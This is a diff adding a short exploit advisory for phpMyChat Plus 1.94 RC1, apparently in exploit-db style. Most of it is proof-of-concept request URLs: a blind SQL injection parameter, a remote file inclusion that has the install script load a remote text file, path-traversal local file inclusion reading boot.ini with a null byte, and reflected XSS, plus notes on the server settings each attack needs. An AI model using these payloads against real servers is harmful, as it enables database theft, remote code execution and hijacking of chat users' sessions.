@@ -1,0 +1,64 @@
+############################################
+### Exploit Title: phpMyChat Plus v1.94 RC1 Multiple Remote Vulnerabilities
+### Date: 04/10/2012 
+### Author: L0n3ly-H34rT 
+### Contact: l0n3ly_h34rt@hotmail.com 
+### My Site: http://se3c.blogspot.com/ 
+### Vendor Link: http://sourceforge.net/projects/phpmychat/
+### Software Link: http://sourceforge.net/projects/phpmychat/files/latest/download
+### Version: 1.94 RC1
+### Tested on: Linux/Windows 
+############################################
+
+1- Remote Blind SQL Injection :
+
+# P.O.C :
+
+http://localhost/plus/users_popuph.php?B=1&From=remotelogin.php&L=hebrew&LastCheck=[Blind SQL]
+
+----------------------------------------------------------------------------------------
+
+2- Remote File Inclusion :
+
+# P.O.C :
+
+http://localhost/plus/install/old/install.php?ChatPath=http://127.0.0.1/c.txt?
+
+----------------------------------------------------------------------------------------
+
+3- Local File Inclusion :
+
+- Based on this exploit :
+
+http://www.exploit-db.com/exploits/17213/
+
+# P.O.C :
+
+http://localhost/plus/install/old/install.php?ChatPath=../../../../../../boot.ini%00
+
+http://localhost/plus/install/old/install.php?L=../../../../../../boot.ini%00
+
+---------------------------------------------------------------------------------------
+
+4- XSS :
+
+# P.O.C :
+
+http://localhost/plus/input.php?D=20&From=remotelogin.php&L=serbian_latin&N=10&NT=1&O=1&R=Public Room 1&ST=1&T=1&U=[XSS]&Ver=H
+
+http://localhost/plus/users_popuph.php?B=1&From=remotelogin.php&L=chinese_traditional&LastCheck=[XSS]
+
+
+############################################
+
+# Notes :
+
+1- For Remote Blind SQL Injection ( you can use some automatic blind sql injection to get database informations ).
+
+2- For Remote File Inclusion ( must be allow_url_include=On ).
+
+3- For Local File Inclusion ( must be magic_quotes_gpc = Off )
+
+4- For XSS ( you must have a good brain :p )
+
+# Greetz to my friendz
